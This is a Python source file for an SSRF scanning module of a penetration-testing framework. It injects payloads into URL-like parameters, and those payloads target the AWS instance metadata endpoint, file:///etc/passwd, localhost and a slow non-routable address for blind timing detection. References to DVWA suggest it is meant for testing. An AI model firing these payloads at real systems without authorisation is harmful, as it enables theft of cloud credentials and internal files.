"""SSRF Module for TanPha V4 (Global - Anti False Positive)."""
import time
from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse
from modules.base import BaseModule
from core.context import TargetContext, Evidence, Finding
from core.verification import VerificationResult, VerificationStatus


class SSRFModule(BaseModule):
    name = "ServerSideRequestForgery"
    module_id = "ssrf"
    version = "1.7 (Global-Ready)"
    vulnerability_class = "SSRF"
    default_impact = "INTERNAL_NETWORK_ACCESS"
    default_privilege = "SERVER"

    def can_run(self, context: TargetContext) -> bool:
        return True

    def _send_smart_request(self, context, param, payload, scope_checker=None, timeout=6):
        # 1. TRY GET
        parsed = urlparse(context.target.base_url)
        qs = parse_qsl(parsed.query, keep_blank_values=True)
        new_qs = [(k, payload) if k == param else (k, v) for k, v in qs]
        if not new_qs: new_qs = [(param, payload)]
        
        target_url = urlunparse(parsed._replace(query=urlencode(new_qs, safe=":/")))
        res_get = context.http_client.request("GET", target_url, target_param=param, scope_checker=scope_checker, bypass_mutation=True, timeout=timeout)
        
        if res_get.response is not None:
            # Bersihkan payload dari response (cegah false positive pantulan)
            clean_text = res_get.response.text.lower().replace(payload.lower(), "")
            if any(ind in clean_text for ind in ["root:x:0:0", "ami-id", "localhost", "127.0.0.1", "apache", "nginx", "example domain"]):
                return res_get, "GET"

        # 2. TRY POST (Fallback)
        data = {param: payload}
        submit_field = next((p for p in context.discovery.parameters if "submit" in p.lower()), "Submit")
        if submit_field: data[submit_field] = "Submit"
        
        res_post = context.http_client.request("POST", context.target.base_url, data=data, scope_checker=scope_checker, bypass_mutation=True, timeout=timeout)
        return res_post, "POST"

    def assess(self, context: TargetContext, scope_checker=None) -> list[Evidence]:
        params_to_test = [p for p in context.discovery.parameters if any(k in p.lower() for k in ["url", "path", "dest", "redirect", "uri", "link", "src", "fetch", "load"])]
        if not params_to_test:
            params_to_test = context.discovery.parameters
        if not params_to_test:
            params_to_test = ["url", "uri", "path", "dest"]
            print(f"      [*] Discovery failed. Using default SSRF parameters: {params_to_test}")

        print(f"      [>] Testing SSRF on parameters: {params_to_test}")
        
        parsed_target = urlparse(context.target.base_url)
        host = parsed_target.hostname or "127.0.0.1"
        port = parsed_target.port or 80
        local_url = f"http://{host}:{port}/"
        
        # Prioritas 1: Domain luar (ngecek koneksi internet)
        # Prioritas 2: Localhost (ngecek internal)
        payloads = [
            {"payload": "http://example.com", "desc": "External Domain Test", "indicators": ["example domain", "iana"]},
            {"payload": local_url, "desc": "Localhost Dynamic", "indicators": ["login", "apache", "nginx", "it works", "dvwa"]},
            {"payload": "http://169.254.169.254/latest/meta-data/", "desc": "AWS Metadata", "indicators": ["ami-id", "iam", "security-credentials"]},
            {"payload": "file:///etc/passwd", "desc": "Local File Read (Linux)", "indicators": ["root:x:0:0", "bin/bash"]},
            {"payload": "http://10.255.255.1", "desc": "Time-Based (Blind SSRF)", "indicators": []} 
        ]

        for param in params_to_test:
            for item in payloads:
                start_time = time.time()
                res, method = self._send_smart_request(context, param, item["payload"], scope_checker, timeout=6)
                elapsed = time.time() - start_time
                
                # 1. CEK BLIND SSRF (Kalau response lama banget)
                if elapsed >= 5.0:
                    print(f"      [!] Potential Blind SSRF found on '{param}' using {item['desc']} (Delay: {elapsed:.1f}s)")
                    return [Evidence(
                        attempt_id="ssrf_time", module_id=self.module_id, module_version=self.version,
                        location=context.target.base_url, parameter=param, outcome="DELAYED_RESPONSE",
                        reason_code="SSRF_TIMEOUT", reason_detail=f"Server hung for {elapsed:.1f}s",
                        confidence=0.8, evidence_text=f"Payload: {item['payload']}", assess_payload=item["payload"]
                    )]

                # 2. CEK KONTEN (Anti False Positive)
                if res.response is not None:
                    # Buang teks payload dari respons (karena DVWA suka nge-reflect input)
                    clean_text = res.response.text.lower().replace(item["payload"].lower(), "")
                    
                    if item["indicators"] and any(ind in clean_text for ind in item["indicators"]):
                        print(f"      [!] Potential SSRF ({method}) found on '{param}' using {item['desc']}")
                        return [Evidence(
                            attempt_id="ssrf_content", module_id=self.module_id, module_version=self.version,
                            location=context.target.base_url, parameter=param, outcome="CHANGED_RESPONSE",
                            reason_code="SSRF_CONTENT", reason_detail=f"Matched internal content via {item['desc']}",
                            confidence=0.9, evidence_text=f"Payload: {item['payload']}", assess_payload=item["payload"]
                        )]
                        
        return []

    def verify(self, context: TargetContext, evidence: Evidence, scope_checker=None) -> VerificationResult:
        print(f"      [*] Verifying SSRF on '{evidence.parameter}'...")
        
        res, _ = self._send_smart_request(context, evidence.parameter, evidence.assess_payload, scope_checker)
        
        if evidence.reason_code == "SSRF_TIMEOUT":
            if res.elapsed >= 5.0 or res.response is None:
                return VerificationResult(VerificationStatus.VALIDATED, 0.95, "SSRF_TIMEOUT_CONFIRMED", f"Delay confirmed", verify_payload=evidence.assess_payload)
            return VerificationResult(VerificationStatus.REJECTED, 0.0, "SSRF_TIMEOUT_FAILED", "No delay detected")
            
        if res.response is not None:
            clean_text = res.response.text.lower().replace(evidence.assess_payload.lower(), "")
            indicators = ["root:x:0:0", "localhost", "ami-id", "apache", "nginx", "dvwa", "example domain", "iana"]
            if any(ind in clean_text for ind in indicators):
                return VerificationResult(VerificationStatus.VALIDATED, 0.95, "SSRF_CONFIRMED", "Internal content matched", verify_payload=evidence.assess_payload)
                
        return VerificationResult(VerificationStatus.REJECTED, 0.0, "SSRF_FAILED", "No internal content found.")

    def exploit(self, context: TargetContext, finding: Finding):
        print("\n[***] SSRF EXPLOITATION INFO [***]")
        print(f"[*] Target URL : {finding.location}")
        print(f"[*] Vulnerable Parameter : {finding.parameter}")
        print(f"[*] Payload : {finding.verify_payload}")
        print("\n[!] Server is vulnerable to fetching internal resources.")
